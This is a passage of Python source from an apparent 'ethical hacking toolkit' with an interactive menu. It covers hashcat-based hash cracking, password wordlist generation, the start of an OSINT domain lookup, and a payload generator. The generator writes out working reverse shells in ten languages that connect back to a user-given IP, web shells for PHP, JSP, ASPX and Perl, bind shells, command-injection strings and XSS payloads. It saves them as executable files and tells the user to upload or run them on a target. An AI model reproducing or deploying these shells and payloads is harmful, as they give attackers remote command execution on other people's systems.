                    cracked = True
                if "Recovered......: 1/" in line and ":" in line:
                    password_part = line.split(":")[1]
                    if password_part:
                        password = password_part.strip()

        if cracked and password:
            display_panel(
                "Hash Cracking Success",
                f"Hash: {hash_input}\nPassword: {password}",
                NordColors.GREEN
            )
        else:
            display_panel(
                "Hash Cracking Failed",
                "Could not crack the hash with the given parameters. Try a different wordlist or attack mode.",
                NordColors.RED
            )

        if get_confirmation("Save crack attempt results to file?"):
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"hashcrack_{timestamp}.txt"
            filepath = RESULTS_DIR / filename

            with open(filepath, "w") as f:
                f.write(f"Hash: {hash_input}\n")
                f.write(f"Hash Type: {selected_hash_type['name']}\n")
                f.write(f"Attack Mode: {selected_mode['name']}\n")
                f.write(f"Status: {'Cracked' if cracked else 'Failed'}\n")
                if password:
                    f.write(f"Password: {password}\n")
                f.write("\n--- Full Output ---\n")
                f.write(result.stdout)

            print_success(f"Results saved to {filepath}")

    except Exception as e:
        print_error(f"Hash cracking error: {e}")


def dictionary_generator():
    wordlist_name = get_user_input("Enter name for the wordlist")
    if not wordlist_name:
        wordlist_name = f"wordlist_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"

    console.print(f"[bold {NordColors.FROST_2}]Dictionary generation options:[/]")
    console.print("  1. Basic wordlist with common passwords")
    console.print("  2. Name-based wordlist")
    console.print("  3. Date-based wordlist")
    console.print("  4. Custom word mutations")

    option = get_integer_input("Select option", 1, 4)
    if option <= 0:
        return

    words = []

    if option == 1:
        words = [
            "password", "123456", "12345678", "qwerty", "admin", "welcome",
            "password123", "123456789", "1234567890", "abc123", "letmein",
            "monkey", "admin123", "iloveyou", "1234", "1qaz2wsx", "dragon",
            "sunshine", "princess", "football", "baseball", "welcome1",
            "master", "superman", "batman", "trustno1", "shadow", "cheese"
        ]
    elif option == 2:
        names = get_user_input("Enter names separated by commas (e.g., john,mike,susan)")
        if names:
            base_names = [name.strip() for name in names.split(",")]

            for name in base_names:
                name_lower = name.lower()
                name_capital = name.capitalize()

                words.extend([
                    name_lower, name_capital,
                    f"{name_lower}123", f"{name_capital}123",
                    f"{name_lower}2023", f"{name_capital}2023",
                    f"{name_lower}2024", f"{name_capital}2024"
                ])
    elif option == 3:
        current_year = datetime.datetime.now().year
        for year in range(current_year - 10, current_year + 2):
            words.extend([
                f"{year}",
                f"password{year}",
                f"admin{year}",
                f"{year}admin",
                f"{year}password"
            ])

            # Add common date formats
            for month in range(1, 13):
                for day in range(1, 31):
                    if (month == 2 and day > 29) or ((month in [4, 6, 9, 11]) and day > 30):
                        continue
                    words.extend([
                        f"{month:02d}{day:02d}{year}",
                        f"{day:02d}{month:02d}{year}",
                        f"{month:02d}{day:02d}{str(year)[2:]}",
                        f"{day:02d}{month:02d}{str(year)[2:]}"
                    ])
    elif option == 4:
        base_words = get_user_input("Enter base words separated by commas (e.g., company,project,server)")
        if not base_words:
            print_error("No base words provided")
            return

        base_list = [word.strip() for word in base_words.split(",")]
        for word in base_list:
            # Original word
            words.append(word)

            # Common mutations
            words.extend([
                word.lower(), word.upper(), word.capitalize(),
                f"{word}123", f"{word}2023", f"{word}2024",
                f"{word}!", f"{word}!!", f"{word}1", f"{word}12"
            ])

            # Leet speak
            leet_map = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
            leet_word = ''.join(leet_map.get(c, c) for c in word.lower())
            if leet_word != word.lower():
                words.append(leet_word)
                words.append(f"{leet_word}123")

    # Remove duplicates
    words = list(set(words))

    # Display preview
    console.print()
    table = Table(
        title=f"Dictionary Preview ({len(words)} words)",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("Sample Words", style=NordColors.SNOW_STORM_1)

    preview_words = random.sample(words, min(10, len(words)))
    for word in preview_words:
        table.add_row(word)

    console.print(table)

    if get_confirmation("Save wordlist to file?"):
        filepath = WORDLISTS_DIR / f"{wordlist_name}.txt"

        with open(filepath, "w") as f:
            for word in words:
                f.write(f"{word}\n")

        print_success(f"Created wordlist with {len(words)} words: {filepath}")


def payload_generation_module():
    console.clear()
    console.print(create_header())
    display_panel(
        "Payload Generation",
        "Generate various security testing payloads.",
        NordColors.RED
    )

    options = [
        ("1", "Reverse Shell", "Generate reverse shell payloads"),
        ("2", "Web Shell", "Generate web shells for different platforms"),
        ("3", "Bind Shell", "Generate bind shell payloads"),
        ("4", "Command Injection", "Generate command injection payloads"),
        ("5", "XSS Payloads", "Generate cross-site scripting payloads"),
        ("0", "Return", "Return to Main Menu")
    ]

    console.print(create_menu_table("Payload Options", options))

    choice = get_integer_input("Select an option", 0, 5)
    if choice == 0:
        return
    elif choice == 1:
        generate_reverse_shell()
    elif choice == 2:
        generate_web_shell()
    elif choice == 3:
        generate_bind_shell()
    elif choice == 4:
        generate_cmd_injection()
    elif choice == 5:
        generate_xss_payloads()

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def generate_reverse_shell():
    ip = get_user_input("Enter your IP address")
    if not ip:
        return

    port = get_integer_input("Enter listening port", 1, 65535)
    if port <= 0:
        return

    platforms = [
        "bash", "python", "perl", "php", "ruby", "netcat",
        "powershell", "java", "golang", "awk"
    ]

    console.print(f"[bold {NordColors.FROST_2}]Available platforms:[/]")
    for i, platform in enumerate(platforms, 1):
        console.print(f"  {i}. {platform}")

    platform_choice = get_integer_input(f"Select platform (1-{len(platforms)})", 1, len(platforms))
    if platform_choice <= 0:
        return

    selected_platform = platforms[platform_choice - 1]

    # Generate payload based on selected platform
    payload = ""
    filename = f"reverse_shell_{selected_platform}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
    file_extension = "sh"

    if selected_platform == "bash":
        payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        file_extension = "sh"
    elif selected_platform == "python":
        payload = f'''#!/usr/bin/env python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])'''
        file_extension = "py"
    elif selected_platform == "perl":
        payload = f'''#!/usr/bin/env perl
use Socket;
$i="{ip}";
$p={port};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{
  open(STDIN,">&S");
  open(STDOUT,">&S");
  open(STDERR,">&S");
  exec("/bin/sh -i");
}};'''
        file_extension = "pl"
    elif selected_platform == "php":
        payload = f'''<?php
$sock=fsockopen("{ip}",{port});
exec("/bin/sh -i <&3 >&3 2>&3");
?>'''
        file_extension = "php"
    elif selected_platform == "ruby":
        payload = f'''#!/usr/bin/env ruby
require 'socket'
s=TCPSocket.new("{ip}",{port})
Process.fork{{exec "/bin/sh -i <&3 >&3 2>&3"}}'''
        file_extension = "rb"
    elif selected_platform == "netcat":
        payload = f"nc -e /bin/sh {ip} {port}"
        file_extension = "sh"
    elif selected_platform == "powershell":
        payload = f'''$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush();
}}
$client.Close();'''
        file_extension = "ps1"
    elif selected_platform == "java":
        payload = f'''
public class Reverse {{
    public static void main(String[] args) {{
        try {{
            Runtime r = Runtime.getRuntime();
            Process p = r.exec(new String[]{{"/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"}});
            p.waitFor();
        }} catch (Exception e) {{}}
    }}
}}'''
        file_extension = "java"
    elif selected_platform == "golang":
        payload = f'''package main
import (
	"net"
	"os/exec"
	"time"
)
func main() {{
	c, _ := net.Dial("tcp", "{ip}:{port}")
	for {{
		cmd := exec.Command("/bin/sh")
		cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
		cmd.Run()
		time.Sleep(time.Second)
	}}
}}'''
        file_extension = "go"
    elif selected_platform == "awk":
        payload = f'''#!/usr/bin/awk -f
BEGIN {{
    s = "/inet/tcp/0/{ip}/{port}";
    while(42) {{
        do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit")
        close(s);
    }}
}}'''
        file_extension = "awk"

    # Display payload
    console.print()
    display_panel(
        f"Reverse Shell Payload ({selected_platform})",
        f"Connecting to: {ip}:{port}",
        NordColors.RED
    )

    language = selected_platform
    if selected_platform == "netcat":
        language = "bash"

    console.print(Syntax(payload, language, theme="nord"))

    # Save payload
    if get_confirmation("Save payload to file?"):
        filepath = PAYLOADS_DIR / f"{filename}.{file_extension}"

        with open(filepath, "w") as f:
            f.write(payload)

        os.chmod(filepath, 0o755)  # Make executable
        print_success(f"Payload saved to {filepath}")

        # Also save as Payload object
        payload_obj = Payload(
            name=filename,
            payload_type="reverse_shell",
            target_platform=selected_platform,
            content=payload
        )
        save_result_to_file(payload_obj, f"{filename}.json")


def generate_web_shell():
    platforms = ["php", "jsp", "aspx", "perl"]

    console.print(f"[bold {NordColors.FROST_2}]Available platforms:[/]")
    for i, platform in enumerate(platforms, 1):
        console.print(f"  {i}. {platform}")

    platform_choice = get_integer_input(f"Select platform (1-{len(platforms)})", 1, len(platforms))
    if platform_choice <= 0:
        return

    selected_platform = platforms[platform_choice - 1]

    # Generate payload based on selected platform
    payload = ""
    filename = f"web_shell_{selected_platform}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"

    if selected_platform == "php":
        payload = '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
}
?>
<form method="post">
<input type="text" name="cmd" style="width:500px;height:30px;">
<button type="submit">Execute</button>
</form>'''
    elif selected_platform == "jsp":
        payload = '''<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    out.println("<pre>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
    out.println("</pre>");
}
%>
<form method="post">
<input type="text" name="cmd" style="width:500px;height:30px;">
<button type="submit">Execute</button>
</form>'''
    elif selected_platform == "aspx":
        payload = '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Button1_Click(object sender, EventArgs e)
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + TextBox1.Text;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        StreamReader stmrdr = p.StandardOutput;
        string output = stmrdr.ReadToEnd();
        stmrdr.Close();
        Response.Write("<pre>" + output + "</pre>");
    }
</script>
<html>
<body>
    <form id="form1" runat="server">
        <asp:TextBox ID="TextBox1" runat="server" Width="500px" />
        <asp:Button ID="Button1" runat="server" Text="Execute" OnClick="Button1_Click" />
    </form>
</body>
</html>'''
    elif selected_platform == "perl":
        payload = '''#!/usr/bin/perl
print "Content-type: text/html\\n\\n";
print "<html><head><title>Web Shell</title></head><body>";
print "<form method='post'>";
print "<input type='text' name='cmd' style='width:500px;height:30px;'>";
print "<button type='submit'>Execute</button>";
print "</form>";
if ($ENV{'REQUEST_METHOD'} eq "POST") {
    read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
    @pairs = split(/&/, $buffer);
    foreach $pair (@pairs) {
        ($name, $value) = split(/=/, $pair);
        $value =~ tr/+/ /;
        $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
        $FORM{$name} = $value;
    }
    $cmd = $FORM{cmd};
    print "<pre>";
    print `$cmd`;
    print "</pre>";
}
print "</body></html>";'''

    # Display payload
    console.print()
    display_panel(
        f"Web Shell Payload ({selected_platform})",
        "This is a minimal web shell for security testing. Use responsibly.",
        NordColors.RED
    )

    console.print(Syntax(payload, selected_platform, theme="nord"))
    console.print(f"[bold {NordColors.YELLOW}]USAGE:[/] Upload to target server and access via browser.")

    # Save payload
    if get_confirmation("Save payload to file?"):
        filepath = PAYLOADS_DIR / f"{filename}.{selected_platform}"

        with open(filepath, "w") as f:
            f.write(payload)

        print_success(f"Payload saved to {filepath}")

        # Also save as Payload object
        payload_obj = Payload(
            name=filename,
            payload_type="web_shell",
            target_platform=selected_platform,
            content=payload
        )
        save_result_to_file(payload_obj, f"{filename}.json")


def generate_bind_shell():
    port = get_integer_input("Enter listening port for bind shell", 1, 65535)
    if port <= 0:
        return

    platforms = ["bash", "python", "perl", "powershell"]

    console.print(f"[bold {NordColors.FROST_2}]Available platforms:[/]")
    for i, platform in enumerate(platforms, 1):
        console.print(f"  {i}. {platform}")

    platform_choice = get_integer_input(f"Select platform (1-{len(platforms)})", 1, len(platforms))
    if platform_choice <= 0:
        return

    selected_platform = platforms[platform_choice - 1]

    # Generate payload based on selected platform
    payload = ""
    filename = f"bind_shell_{selected_platform}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
    file_extension = "sh"

    if selected_platform == "bash":
        payload = f'''#!/bin/bash
# Bind shell on port {port}
nc -lvp {port} -e /bin/bash'''
        file_extension = "sh"
    elif selected_platform == "python":
        payload = f'''#!/usr/bin/env python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",{port}))
s.listen(5)
while True:
    c,a=s.accept()
    os.dup2(c.fileno(),0)
    os.dup2(c.fileno(),1)
    os.dup2(c.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])'''
        file_extension = "py"
    elif selected_platform == "perl":
        payload = f'''#!/usr/bin/env perl
use Socket;
$p={port};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
bind(S,sockaddr_in($p, INADDR_ANY));
listen(S,SOMAXCONN);
while(accept(C,S)){{
    open(STDIN,">&C");
    open(STDOUT,">&C");
    open(STDERR,">&C");
    exec("/bin/sh -i");
}};'''
        file_extension = "pl"
    elif selected_platform == "powershell":
        payload = f'''$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{port});
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}
$client.Close();
$listener.Stop();'''
        file_extension = "ps1"

    # Display payload
    console.print()
    display_panel(
        f"Bind Shell Payload ({selected_platform})",
        f"Listening on port: {port}",
        NordColors.RED
    )

    console.print(Syntax(payload, selected_platform, theme="nord"))
    console.print(f"[bold {NordColors.YELLOW}]USAGE:[/] Run on target system. Connect with: nc <target_ip> {port}")

    # Save payload
    if get_confirmation("Save payload to file?"):
        filepath = PAYLOADS_DIR / f"{filename}.{file_extension}"

        with open(filepath, "w") as f:
            f.write(payload)

        os.chmod(filepath, 0o755)  # Make executable
        print_success(f"Payload saved to {filepath}")

        # Also save as Payload object
        payload_obj = Payload(
            name=filename,
            payload_type="bind_shell",
            target_platform=selected_platform,
            content=payload
        )
        save_result_to_file(payload_obj, f"{filename}.json")


def generate_cmd_injection():
    platforms = ["unix", "windows"]

    console.print(f"[bold {NordColors.FROST_2}]Target platform:[/]")
    for i, platform in enumerate(platforms, 1):
        console.print(f"  {i}. {platform}")

    platform_choice = get_integer_input(f"Select platform (1-{len(platforms)})", 1, len(platforms))
    if platform_choice <= 0:
        return

    selected_platform = platforms[platform_choice - 1]

    # Generate command injection payloads
    payloads = []

    if selected_platform == "unix":
        payloads = [
            {"description": "Basic command injection", "payload": "; ls -la"},
            {"description": "Command injection with output redirection", "payload": "$(ls -la)"},
            {"description": "Command substitution", "payload": "`ls -la`"},
            {"description": "Pipe command injection", "payload": "| ls -la"},
            {"description": "AND operator", "payload": "&& ls -la"},
            {"description": "OR operator", "payload": "|| ls -la"},
            {"description": "Background execution", "payload": "& ls -la"},
            {"description": "Newline injection", "payload": "\\n ls -la"},
            {"description": "Base64 encoded command", "payload": "echo bHMgLWxh | base64 -d | bash"},
            {"description": "Backtick with URL encoding", "payload": "%60ls%20-la%60"}
        ]
    else:  # Windows
        payloads = [
            {"description": "Basic command injection", "payload": "& dir"},
            {"description": "Command injection with output redirection", "payload": "; dir"},
            {"description": "Multiple commands", "payload": "dir & ipconfig"},
            {"description": "AND operator", "payload": "&& dir C:\\"},
            {"description": "OR operator", "payload": "|| dir"},
            {"description": "Command substitution (PowerShell)", "payload": "$(dir)"},
            {"description": "Pipe command injection", "payload": "| dir"},
            {"description": "Newline injection", "payload": "\\r\\n dir"},
            {"description": "PowerShell encoded command", "payload": "powershell -enc ZABpAHIA"},
            {"description": "Command with URL encoding", "payload": "%26%20dir"}
        ]

    # Display payloads
    console.print()
    table = Table(
        title=f"Command Injection Payloads ({selected_platform})",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
        border_style=NordColors.RED
    )
    table.add_column("#", style=f"bold {NordColors.FROST_2}")
    table.add_column("Description", style=NordColors.SNOW_STORM_1)
    table.add_column("Payload", style=NordColors.FROST_3)

    for i, payload in enumerate(payloads, 1):
        table.add_row(str(i), payload["description"], payload["payload"])

    console.print(table)
    console.print(
        f"[bold {NordColors.YELLOW}]USAGE:[/] Add these to input fields to test for command injection vulnerabilities")

    # Save payloads
    if get_confirmation("Save payloads to file?"):
        filename = f"cmd_injection_{selected_platform}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filepath = PAYLOADS_DIR / filename

        with open(filepath, "w") as f:
            f.write(f"# Command Injection Payloads for {selected_platform}\n")
            f.write("# Generated by macOS Ethical Hacking Toolkit\n\n")

            for payload in payloads:
                f.write(f"# {payload['description']}\n")
                f.write(f"{payload['payload']}\n\n")

        print_success(f"Payloads saved to {filepath}")

        # Also save in JSON format
        json_filename = f"cmd_injection_{selected_platform}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        save_result_to_file(
            {"platform": selected_platform, "payloads": payloads, "timestamp": datetime.datetime.now().isoformat()},
            json_filename
        )


def generate_xss_payloads():
    payload_categories = [
        "basic", "alert", "img", "body", "svg", "script", "event", "encoded"
    ]

    console.print(f"[bold {NordColors.FROST_2}]XSS payload categories:[/]")
    for i, category in enumerate(payload_categories, 1):
        console.print(f"  {i}. {category}")
    console.print(f"  {len(payload_categories) + 1}. all")

    category_choice = get_integer_input(f"Select category (1-{len(payload_categories) + 1})", 1,
                                        len(payload_categories) + 1)
    if category_choice <= 0:
        return

    selected_categories = []
    if category_choice <= len(payload_categories):
        selected_categories = [payload_categories[category_choice - 1]]
    else:
        selected_categories = payload_categories

    # Define payloads for each category
    all_payloads = {
        "basic": [
            {"description": "Basic XSS", "payload": "<script>alert('XSS')</script>"},
            {"description": "Basic XSS with double quotes", "payload": "<script>alert(\"XSS\")</script>"},
            {"description": "XSS with HTML encoding", "payload": "&lt;script&gt;alert('XSS')&lt;/script&gt;"}
        ],
        "alert": [
            {"description": "Alert with document cookie", "payload": "<script>alert(document.cookie)</script>"},
            {"description": "Alert with document domain", "payload": "<script>alert(document.domain)</script>"},
            {"description": "Alert with document URL", "payload": "<script>alert(document.URL)</script>"}
        ],
        "img": [
            {"description": "Image tag with onerror", "payload": "<img src=x onerror=alert('XSS')>"},
            {"description": "Image tag with invalid src", "payload": "<img src='javascript:alert(\"XSS\")'/>"},
            {"description": "Image tag without quotes",
             "payload": "<img src=javascript:alert(String.fromCharCode(88,83,83))>"}
        ],
        "body": [
            {"description": "Body tag with onload", "payload": "<body onload=alert('XSS')>"},
            {"description": "Body tag with background", "payload": "<body background='javascript:alert(\"XSS\")'/>"},
            {"description": "Body tag with combined events",
             "payload": "<body onload=alert('XSS') onmouseover=alert('XSS')>"}
        ],
        "svg": [
            {"description": "SVG with onload", "payload": "<svg onload=alert('XSS')>"},
            {"description": "SVG with nested script", "payload": "<svg><script>alert('XSS')</script></svg>"},
            {"description": "SVG with animate tag",
             "payload": "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>"}
        ],
        "script": [
            {"description": "Script with source", "payload": "<script src=data:text/javascript,alert('XSS')></script>"},
            {"description": "Script with eval", "payload": "<script>eval('alert(\"XSS\")')</script>"},
            {"description": "Script with document.write",
             "payload": "<script>document.write('<scr'+'ipt>alert(\"XSS\")</scr'+'ipt>')</script>"}
        ],
        "event": [
            {"description": "Div with onclick", "payload": "<div onclick=alert('XSS')>Click me</div>"},
            {"description": "Iframe with onmouseover", "payload": "<iframe onmouseover=alert('XSS')></iframe>"},
            {"description": "Input with onfocus", "payload": "<input onfocus=alert('XSS') autofocus>"}
        ],
        "encoded": [
            {"description": "JavaScript URI encoded",
             "payload": "javascript:&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"},
            {"description": "HTML hex encoded",
             "payload": "&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;"},
            {"description": "Base64 encoded", "payload": "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>"}
        ]
    }

    selected_payloads = []
    for category in selected_categories:
        selected_payloads.extend(all_payloads[category])

    # Display payloads
    console.print()
    table = Table(
        title=f"XSS Payloads ({', '.join(selected_categories)})",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
        border_style=NordColors.RED
    )
    table.add_column("#", style=f"bold {NordColors.FROST_2}")
    table.add_column("Description", style=NordColors.SNOW_STORM_1)
    table.add_column("Payload", style=NordColors.FROST_3)

    for i, payload in enumerate(selected_payloads, 1):
        table.add_row(str(i), payload["description"], payload["payload"])

    console.print(table)
    console.print(f"[bold {NordColors.YELLOW}]USAGE:[/] Add these to input fields to test for XSS vulnerabilities")

    # Save payloads
    if get_confirmation("Save payloads to file?"):
        filename = f"xss_payloads_{'-'.join(selected_categories)}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filepath = PAYLOADS_DIR / filename

        with open(filepath, "w") as f:
            f.write(f"# XSS Payloads ({', '.join(selected_categories)})\n")
            f.write("# Generated by macOS Ethical Hacking Toolkit\n\n")

            for payload in selected_payloads:
                f.write(f"# {payload['description']}\n")
                f.write(f"{payload['payload']}\n\n")

        print_success(f"Payloads saved to {filepath}")

        # Also save in JSON format
        json_filename = f"xss_payloads_{'-'.join(selected_categories)}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        save_result_to_file(
            {"categories": selected_categories, "payloads": selected_payloads,
             "timestamp": datetime.datetime.now().isoformat()},
            json_filename
        )


def osint_module():
    console.clear()
    console.print(create_header())
    display_panel(
        "OSINT Gathering",
        "Collect open-source intelligence on targets.",
        NordColors.FROST_2
    )

    options = [
        ("1", "Domain Intelligence", "Gather information about a domain"),
        ("2", "IP Intelligence", "Gather information about an IP address"),
        ("3", "Email Intelligence", "Find information related to an email"),
        ("4", "Username Search", "Search for usernames across platforms"),
        ("5", "DNS Reconnaissance", "Advanced DNS lookups"),
        ("0", "Return", "Return to Main Menu")
    ]

    console.print(create_menu_table("OSINT Options", options))

    choice = get_integer_input("Select an option", 0, 5)
    if choice == 0:
        return
    elif choice == 1:
        domain_intelligence()
    elif choice == 2:
        ip_intelligence()
    elif choice == 3:
        email_intelligence()
    elif choice == 4:
        username_search()
    elif choice == 5:
        dns_reconnaissance()

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def domain_intelligence():
    domain = get_user_input("Enter domain to investigate")
    if not domain:
        return

    # Remove protocol if specified
    if "://" in domain:
        domain = domain.split("://")[1]

    # Remove path if specified
    if "/" in domain:
        domain = domain.split("/")[0]

    options = [
        {"name": "WHOIS lookup", "enabled": True},
        {"name": "DNS records", "enabled": True},
        {"name": "SSL certificate", "enabled": True},
        {"name": "Subdomain enumeration", "enabled": shutil.which("subfinder") is not None},
        {"name": "HTTP headers", "enabled": True},
        {"name": "Technology stack detection", "enabled": True}
    ]

    console.print(f"[bold {NordColors.FROST_2}]Select intelligence options:[/]")
    for i, option in enumerate(options, 1):
        status = "[green]Available[/]" if option["enabled"] else "[red]Not Available[/] (Tool missing)"
        console.print(f"  {i}. {option['name']} - {status}")

    selected_options = get_user_input("Select options (comma-separated numbers, or 'all')")

    if not selected_options:
        return

    selected_indices = []
    if selected_options.lower() == "all":
        selected_indices = [i for i, option in enumerate(options) if option["enabled"]]
    else:
        try:
            selected_indices = [int(i.strip()) - 1 for i in selected_options.split(",")]
            # Filter out indices that are out of range or disabled
            selected_indices = [i for i in selected_indices if i >= 0 and i < len(options) and options[i]["enabled"]]
        except ValueError:
            print_error("Invalid selection")
            return

    if not selected_indices:
        print_error("No valid options selected")
        return

    # Collect intelligence
    results = {}

    with console.status(f"[bold {NordColors.FROST_2}]Gathering intelligence on {domain}..."):
        for idx in selected_indices:
            option = options[idx]

            if option["name"] == "WHOIS lookup":
                results["whois"] = fetch_whois(domain)
            elif option["name"] == "DNS records":
                results["dns"] = fetch_dns_records(domain)
            elif option["name"] == "SSL certificate":
                results["ssl"] = fetch_ssl_info(domain)
            elif option["name"] == "Subdomain enumeration":
                results["subdomains"] = enumerate_subdomains(domain)
            elif option["name"] == "HTTP headers":
                results["headers"] = fetch_http_headers(domain)
            elif option["name"] == "Technology stack detection":
                results["technologies"] = detect_technologies(domain)

    # Display results
    console.print()
    display_panel(
        "Domain Intelligence Results",
        f"Target: {domain}",
        NordColors.FROST_2
    )

    if "whois" in results:
        whois_table = Table(
            title="WHOIS Information",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        whois_table.add_column("Field", style=f"bold {NordColors.FROST_2}")
        whois_table.add_column("Value", style=NordColors.SNOW_STORM_1)

        for field, value in results["whois"].items():
            if isinstance(value, list):
                value = ", ".join(value)
            whois_table.add_row(field, str(value))

        console.print(whois_table)

    if "dns" in results:
        dns_table = Table(
            title="DNS Records",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        dns_table.add_column("Type", style=f"bold {NordColors.FROST_2}")
        dns_table.add_column("Value", style=NordColors.SNOW_STORM_1)

        for record_type, records in results["dns"].items():
            for record in records:
                dns_table.add_row(record_type, record)

        console.print(dns_table)

    if "ssl" in results and results["ssl"]:
        ssl_table = Table(
            title="SSL Certificate",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        ssl_table.add_column("Field", style=f"bold {NordColors.FROST_2}")
        ssl_table.add_column("Value", style=NordColors.SNOW_STORM_1)

        for field, value in results["ssl"].items():
            ssl_table.add_row(field, str(value))

        console.print(ssl_table)

    if "subdomains" in results and results["subdomains"]:
        sub_table = Table(
            title="Subdomains",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        sub_table.add_column("Subdomain", style=NordColors.SNOW_STORM_1)

        for subdomain in results["subdomains"]:
            sub_table.add_row(subdomain)

        console.print(sub_table)

    if "headers" in results and results["headers"]:
        header_table = Table(
            title="HTTP Headers",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        header_table.add_column("Header", style=f"bold {NordColors.FROST_2}")
        header_table.add_column("Value", style=NordColors.SNOW_STORM_1)

        for header, value in results["headers"].items():
            header_table.add_row(header, value)

        console.print(header_table)

    if "technologies" in results and results["technologies"]:
        tech_table = Table(
            title="Technology Stack",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        tech_table.add_column("Technology", style=f"bold {NordColors.FROST_2}")
        tech_table.add_column("Category", style=NordColors.SNOW_STORM_1)

        for tech in results["technologies"]:
            tech_table.add_row(tech["name"], tech["category"])

        console.print(tech_table)

    # Save results
    if get_confirmation("Save intelligence results to file?"):
        osint_result = OSINTResult(
            target=domain,
            source_type="domain_intelligence",
            data=results
        )

        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"domain_intel_{domain.replace('.', '_')}_{timestamp}.json"
        save_result_to_file(osint_result, filename)


def fetch_whois(domain):
    whois_data = {
        "registrar": "Unknown",
        "creation_date": "Unknown",
        "expiration_date": "Unknown",
        "name_servers": []
    }

    try:
        if shutil.which("whois"):
            result = run_command(["whois", domain], capture_output=True, check=False, timeout=10)

            if result.stdout:
                for line in result.stdout.splitlines():
                    line = line.strip()

                    # Extract common WHOIS fields
                    if ":" in line:
                        key, value = line.split(":", 1)
                        key = key.strip().lower()
                        value = value.strip()

                        if "registrar" in key and whois_data["registrar"] == "Unknown":
                            whois_data["registrar"] = value
                        elif any(x in key for x in ["creation", "created"]) and whois_data[
                            "creation_date"] == "Unknown":
                            whois_data["creation_date"] = value
                        elif any(x in key for x in ["expiration", "expires"]) and whois_data[
                            "expiration_date"] == "Unknown":
